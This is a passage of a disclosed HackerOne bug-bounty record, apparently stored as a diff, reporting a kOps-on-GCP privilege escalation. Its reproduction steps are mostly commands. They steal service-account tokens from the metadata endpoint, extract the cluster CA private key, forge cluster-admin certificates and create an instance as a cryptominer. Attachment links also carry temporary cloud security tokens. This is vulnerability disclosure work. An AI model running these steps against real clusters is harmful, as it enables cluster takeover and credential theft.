@@ -1,0 +1,479 @@
+{
+  "id": 1842829,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODQyODI5",
+  "url": "https://hackerone.com/reports/1842829",
+  "title": "Privilege Escalation in kOps using GCE/GCP Provider",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2023-01-22T00:39:33.518Z",
+  "submitted_at": "2023-01-22T00:39:36.189Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jpts",
+    "url": "/jpts",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 39386,
+    "url": "https://hackerone.com/kubernetes",
+    "handle": "kubernetes",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Kubernetes",
+      "twitter_handle": "kubernetesio",
+      "website": "https://kubernetes.io/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-08-04T19:24:50.539Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-07-05T19:24:49.231Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nWhen using kOps with the GCP provider, it is possible for a user with shell access to any pod, to escalate their privileges to cluster admin. During provisioning of the cluster, kOps gives all nodes access to the state storage bucket through the service account associated with the instance. Any user with shell access can request the service account credentials, and read sensitive information from the state store. Using this information, the user can privesc to cluster admin, compromising the entire cluster. It is further possible to compromise a privileged GCP service account associated with the control-plane nodes and takeover other resources in the GCP project.\n\n## Kubernetes Version:\nKubernetes: v1.25.5\n\n## Component Version:\nkOps: v1.25.3\n\n## Steps To Reproduce:\n### Cluster Setup:\n\nThe test cluster was setup as close to the [getting started](https://kops.sigs.k8s.io/getting_started/gce/) guide as possible.\n```bash\nexport KOPS_STATE_STORE=gs://kops-state-test/\nexport PROJECT=`gcloud config get-value project`\n\ngsutil mb $KOPS_STATE_STORE\nkops create cluster kops.k8s.local --zones europe-west1-b --state ${KOPS_STATE_STORE} --project=$PROJECT --master-size=n1-standard-2 --node-size=n1-standard-2\nkops update cluster --name kops.k8s.local --yes --admin\nkops validate cluster --wait 10m\n```\n### Privesc\n  1. Add a demo container in which user is allow shell access (manifest attached):\n  `k apply -f shell.yaml`\n  2. Give ourselves a shell:\n  `k exec -it shell-5d64dd647c-8l8s6 -it -- ash`\n  3. Grab the service account token and state bucket name\n  ```\n  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O default.token\n  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script -O- | grep ConfigBase\n  ```\n  4. Copy file back to the host\n  ```\n  k cp shell-5d64dd647c-8l8s6:/default.token default.token\n  ```\n  5.  Ensure normal gcloud auth not in use and set token environment var\n  ```\n  gcloud auth revoke\n  export CLOUDSDK_AUTH_ACCESS_TOKEN=$(jq .access_token -r ./default.token)\n  ```\n  6. Grab the kubernetes CA keys\n  ```\n  mkdir -p keys\n  gcloud storage cat gs://kops-state-test/kops.k8s.local/pki/private/kubernetes-ca/keyset.yaml | yq e '.spec.keys[0].privateMaterial' - | base64 -d > keys/ca.key\n  gcloud storage cat gs://kops-state-test/kops.k8s.local/pki/private/kubernetes-ca/keyset.yaml | yq e '.spec.keys[0].publicMaterial' - | base64 -d > keys/ca.pem\n  ```\n  7. Generate system:masters cert (csr.json template attached)\n  ```\n  cd keys\n  cfssl gencert -ca=ca.pem -ca-key=ca.key -profile=kubernetes csr.json | cfssljson -bare user\n  ```\n  8. Construct new kubeconfig\n  ```\n  export KUBECONFIG=./pwn.kconfig\n  k config set-credentials pwn --client-certificate=user.pem --client-key=user-key.pem\n  k config set-cluster kops --certificate-authority=ca.pem --server=https://<kops-ip>\n  k config set-context pwn@kops --cluster=kops --user=pwn\n  k config use-context pwn@kops\n  ```\n  9. Check we are cluster-admin\n  `k auth can-i '*' '*' -A`\n  10. Deploy a pod on the master node (example manifest included), make sure to edit to the correct node name\n  `k apply -f shell-master.yaml`\n  11. Give ourselves a shell:\n  `k exec -it shell-78d66f6f7c-ft7ch -it -- ash`\n  12. Grab the privileged GCP service account token\n  ```\n  pod$ wget --header 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -O admin.token\n  ```\n 13. Copy the token back to our host\n  ```\n  k cp shell-78d66f6f7c-ft7ch:/admin.token admin.token\n  ```\n  14. Set our credentials\n  ```\n  export CLOUDSDK_AUTH_ACCESS_TOKEN=$(jq .access_token -r ./admin.token)\n  ```\n  15. Run a cryptominer ....\n  ```\n  gcloud compute instances create miner --image-family=ubuntu-2204-lts --zone=europe-west1-b --image-project=ubuntu-os-cloud\n  ```\n\n## Supporting Material/References:\n  * shell.yaml - basic alpine deployment to simulator a user with shell access\n  * shell-master.yaml - similar simple deployment, targeting a master node\n  * csr.json - used to configure cfssl to generate the malicious system:masters mTLS certs\n  * auth-can-i.png - proof we have cluster admin\n  * miner.png - proof we can spin up arbitrary instances\n  * [Kubernetes Engine Service Agent Role](https://cloud.google.com/iam/docs/understanding-roles#container.serviceAgent)\n\n## Tools used\n * https://github.com/cloudflare/cfssl\n * https://github.com/mikefarah/yq\n\n## Impact\n\nOnce the attacker has compromised the cluster, they have access to all cluster resources. This includes any secrets/data stored by the cluster and also any secrets/data that is accessible by any GCP service accounts in use by the cluster. As the attacker is able to compromise the cluster, they can compromise the master nodes. In GCE kOps, the master node service accounts have the \"Kubernetes Engine Service Agent\" role, which is highly permissive, and would likely allow the compromise of other resources in the GCP project. Since the role has compute create permissions, it could also be abused for  attacks such as crypto-mining.",
+  "bounty_amount": "2500.0",
+  "formatted_bounty": "$2,500",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2131950,
+      "file_name": "auth-can-i.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/f1qgv4uue1c9m8uvc8bi9h8x11q6?response-content-disposition=attachment%3B%20filename%3D%22auth-can-i.png%22%3B%20filename%2A%3DUTF-8%27%27auth-can-i.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065353Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f6abdb345e57fd9b11de566d622a17164f832d18eb4d433c2211031a30063635",
+      "file_size": 14104,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2131951,
+      "file_name": "shell.yaml",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tpahdk515j5v7skirowdxkeufkss?response-content-disposition=attachment%3B%20filename%3D%22shell.yaml%22%3B%20filename%2A%3DUTF-8%27%27shell.yaml&response-content-type=application%2Fx-yaml&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065353Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=18e5d41752ac7a17ca0b0c148dc748147a616ce585481b2c574a674d26073400",
+      "file_size": 332,
+      "type": "application/x-yaml",
+      "moderated": null
+    },
+    {
+      "id": 2131952,
+      "file_name": "csr.json",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/abtqulk8gi2ftjf5aokzlse3re37?response-content-disposition=attachment%3B%20filename%3D%22csr.json%22%3B%20filename%2A%3DUTF-8%27%27csr.json&response-content-type=application%2Fjson&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065353Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=40f6f767f3de2596e18ef464dd3191f6b6f6f7999da8623d0bb222b25745dd83",
+      "file_size": 144,
+      "type": "application/json",
+      "moderated": null
+    },
+    {
+      "id": 2131960,
+      "file_name": "miner.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7j3fjrkfzkwm72ztzkhtvrh4mrr2?response-content-disposition=attachment%3B%20filename%3D%22miner.png%22%3B%20filename%2A%3DUTF-8%27%27miner.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065353Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d9dab565519ed07df4bfdfb46862b2d5f8e2bac1f87449372dc530dc6313fa6e",
+      "file_size": 40948,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 2131965,
+      "file_name": "shell-master.yaml",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/760v242silsh360abtpv83qls89j?response-content-disposition=attachment%3B%20filename%3D%22shell-master.yaml%22%3B%20filename%2A%3DUTF-8%27%27shell-master.yaml&response-content-type=application%2Fx-yaml&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065353Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9e881d351cc195299bd87e83e35ef6b864aeeb44e86ab0639e5daa8577b9adda",
+      "file_size": 375,
+      "type": "application/x-yaml",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-08-04T19:24:49.400Z",
+  "allow_singular_disclosure_after": -4274943.963439738,
+  "singular_disclosure_allowed": true,
+  "vote_count": 48,
+  "voters": [
+    "megasp1der",
+    "n1m0",
+    "zy9ard3",
+    "13370verride",
+    "dilawer",
+    "kmxx",
+    "mikkz",
+    "kerolesmagdy",
+    "shivammusic",
+    "mohankumar_c",
+    "and 38 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "adjacent",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 32525,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/kubernetes/kops",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 20035850,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @jpts,\n\nThank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nHave a great day! \n\nKind regards,\n@h1_analyst_oliver",
+      "automated_response": false,
+      "created_at": "2023-01-23T10:41:42.205Z",
+      "updated_at": "2023-01-23T10:41:42.205Z",
+      "actor": {
+        "username": "h1_analyst_oliver",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_oliver",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/663/153/2664a34113403db9945207030f723e4f93a511b0_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": true,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 20629850,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-03-02T18:14:45.025Z",
+      "updated_at": "2023-03-02T18:14:45.025Z",
+      "additional_data": {
+        "old_severity": "Critical (9.0)",
+        "new_severity": "High (8.0)",
+        "old_severity_id": 1827928,
+        "new_severity_id": 1884838
+      },
+      "actor": {
+        "username": "cjcullen",
+        "cleared": false,
+        "verified": false,
+        "url": "/cjcullen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 20629868,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Awarding bounty for Tier 2 - High",
+      "automated_response": false,
+      "created_at": "2023-03-02T18:17:27.317Z",
+      "updated_at": "2023-03-02T18:17:27.317Z",
+      "actor": {
+        "url": "/kubernetes",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Kubernetes"
+        }
+      },
+      "bounty_amount": "2500.0",
+      "bonus_amount": "0.0",
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "kubernetes",
+      "collaborator": {
+        "username": "jpts",
+        "url": "/jpts"
+      }
+    },
+    {
+      "id": 20724976,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for the bounty! Let me know if there's any extra information you need about the issue.",
+      "automated_response": false,
+      "created_at": "2023-03-09T18:53:59.318Z",
+      "updated_at": "2023-03-09T18:53:59.318Z",
+      "actor": {
+        "username": "jpts",
+        "cleared": false,
+        "verified": false,
+        "url": "/jpts",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 21213962,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @jpts,\n\nSorry for the delay. We will be disclosing this publicly in the coming weeks. How would you like to be credited in the CVE?",
+      "automated_response": false,
+      "created_at": "2023-04-10T22:27:54.777Z",
+      "updated_at": "2023-04-10T22:27:54.777Z",
+      "actor": {
+        "username": "cjcullen",
+        "cleared": false,
+        "verified": false,
+        "url": "/cjcullen",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 21224446,
+      "is_internal": false,
+      "editable": false,
